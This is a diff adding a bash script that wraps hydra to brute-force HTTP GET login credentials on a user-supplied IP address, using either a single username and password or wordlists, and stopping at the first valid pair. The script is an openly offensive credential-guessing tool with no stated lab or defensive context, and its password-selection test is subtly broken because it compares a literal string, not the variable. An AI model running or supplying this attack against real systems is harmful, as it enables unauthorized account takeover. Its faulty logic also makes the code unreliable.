@@ -1,0 +1,60 @@
+#!/bin/bash
+
+
+##### Ask User for HTTP IP Address #####
+
+
+echo 'Please enter the IP Address where the HTTP Get Request is located:'
+read ipAddress
+
+
+##### Determine Username(s) #####
+
+
+echo 'Are you using a single username? Or a list of usernames (Enter 1 or 2).'
+unameOptions='Username List'
+
+PS3='Selection:'
+
+select unameOption in $unameOptions
+do
+  if [ $unameOption == 'Username' ]
+  then
+    echo 'Please enter a username to brute force:'
+    read userName
+    userNameArg='-l'
+    break
+  else
+    echo 'Please enter the path to the list of usernames.'
+    read userName
+    userNameArg='-L'
+    break
+  fi
+done
+
+
+##### Determine Password(s) #####
+
+echo 'Are you using a single password? Or a list of passwords (Enter 1 or 2).'
+
+passwordOptions='Password List'
+
+PS3='Selection:'
+
+select passwordOption in $passwordOptions
+do
+  if [ passwordOption == 'Password' ]
+    then
+      echo 'Please enter a password to brute force:'
+      read passWord
+      passWordArg='-p'
+      break
+    else
+      echo 'Please enter the path to the password wordlist you want to use:'
+      read passWord
+      passWordArg='-P'
+      break
+  fi
+done
+
+hydra $ipAddress http-get -v -V $userNameArg $userName $passWordArg $passWord -e ns -t 5 -w 30 -m / -f
